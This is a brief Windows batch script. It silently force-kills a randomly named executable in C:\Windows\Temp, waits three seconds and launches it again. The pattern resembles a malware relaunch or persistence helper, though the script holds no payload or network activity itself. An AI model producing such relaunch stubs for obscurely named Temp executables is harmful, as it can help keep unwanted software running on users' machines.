@echo off
set "exePath=C:\Windows\Temp\dhsyehxhysnx.exe"
set "exeName=dhsyehxhysnx.exe"

taskkill /F /IM %exeName% >nul 2>&1
timeout /t 3 >nul
start "" "%exePath%"
